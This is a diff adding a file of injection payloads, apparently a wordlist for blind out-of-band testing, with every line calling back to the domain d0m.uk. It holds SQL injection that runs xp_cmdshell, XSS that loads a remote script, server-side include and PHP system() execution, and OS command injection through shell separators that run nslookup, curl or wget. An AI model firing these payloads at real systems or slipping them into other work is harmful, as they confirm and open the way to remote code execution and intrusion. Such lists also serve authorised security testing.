@@ -1,0 +1,33 @@
+a'exec master..xp_cmdshell 'nslookup d0m.uk'--
+a"exec master..xp_cmdshell "nslookup d0m.uk"--
+'"></noscript><script src=//d0m.uk></script>
+; DECLARE @command varchar(255); SELECT @command='ping d0m.uk'; EXEC Master.dbo.xp_cmdshell @command; SELECT 1 as 'STEP'
+</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source),s.stack=Error().stack,s.src=(/,/+/d0m.uk/).slice(2),document.documentElement.appendChild(s))//'>
+%3C%22img src='https://d0m.uk'%22%3E
+&lt;!--#exec%20cmd=&quot;nslookup%20d0m.uk&quot;--&gt;
+;nslookup d0m.uk
+;system('nslookup d0m.uk')
+|nslookup d0m.uk
+||nslookup d0m.uk
+\nnslookup d0m.uk
+`nslookup d0m.uk`
+${nslookup d0m.uk}
+a);nslookup d0m.uk
+%0Anslookup%20d0m.uk
+& nslookup d0m.uk &
+%0a nslookup d0m.uk %0a
+$;nslookup d0m.uk
+$(`nslookup d0m.uk`)
+<!--#exec cmd="nslookup d0m.uk"-->
+<?php system("nslookup d0m.uk");?>
+| curl http://d0m.uk
+& curl http://d0m.uk
+; curl http://d0m.uk
+&& curl http://d0m.uk
+|| curl http://d0m.uk
+| wget http://d0m.uk
+& wget http://d0m.uk
+; wget http://d0m.uk
+&& wget http://d0m.uk
+|| wget http://d0m.uk
+echo '<img src=https://d0m.uk ></img>'// XXXXXXXXXXX
